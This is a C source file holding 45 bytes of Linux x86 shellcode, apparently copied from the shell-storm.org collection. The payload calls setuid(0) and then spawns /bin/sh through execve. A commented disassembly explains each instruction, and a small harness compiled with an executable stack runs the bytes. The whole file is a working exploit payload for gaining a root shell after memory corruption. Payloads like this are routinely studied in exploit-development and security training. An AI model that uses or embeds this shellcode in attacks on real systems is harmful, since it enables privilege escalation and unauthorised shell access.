/* http://shell-storm.org/shellcode/files/shellcode-549.php */
/* Linux x86 shellcode by bob */
/* setuid(); execve(); exit(); */
/*
echo -ne "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80" | ndisasm -b 32 - 
    00000000  31C0              xor eax,eax
    00000002  31DB              xor ebx,ebx
    00000004  31C9              xor ecx,ecx
    00000006  B017              mov al,0x17
    00000008  CD80              int 0x80
    0000000A  31C0              xor eax,eax
    0000000C  50                push eax
    0000000D  686E2F7368        push dword 0x68732f6e
    00000012  682F2F6269        push dword 0x69622f2f
    00000017  89E3              mov ebx,esp
    00000019  8D542408          lea edx,[esp+0x8]
    0000001D  50                push eax
    0000001E  53                push ebx
    0000001F  8D0C24            lea ecx,[esp]
    00000022  B00B              mov al,0xb
    00000024  CD80              int 0x80
    00000026  31C0              xor eax,eax
    00000028  B001              mov al,0x1
    0000002A  CD80              int 0x80
*/

/* 
 * Test
 * $ gcc -Wall -z execstack  execve_orig.c 
 * $ ./a.out 
 * Size: 45 bytes.
 * $    
 */

#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"
		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f"
		"\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
		"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0"
		"\xb0\x01\xcd\x80";

typedef int (*func_ptr)();
int main()
{
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        ((func_ptr) shellcode)();
        return 0;
}
